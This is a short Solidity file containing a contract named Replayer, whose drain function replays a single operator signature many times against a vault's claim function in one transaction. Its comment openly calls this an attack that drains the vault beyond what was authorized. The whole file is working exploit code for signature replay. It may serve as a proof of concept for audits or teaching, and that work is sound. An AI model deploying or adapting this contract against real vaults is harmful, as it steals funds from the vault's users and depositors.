// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault { function claim(address to, uint256 amount, bytes calldata sig) external; }

/// @notice The attack in ONE atomic transaction: take one operator signature that authorized a
/// single payout, and replay it `times` times. Each call re-verifies the same signature and pays
/// again, so the vault is drained far beyond what was ever authorized.
contract Replayer {
    function drain(IVault vault, address to, uint256 amount, bytes calldata sig, uint256 times) external {
        for (uint256 i = 0; i < times; i++) {
            vault.claim(to, amount, sig);
        }
    }
}
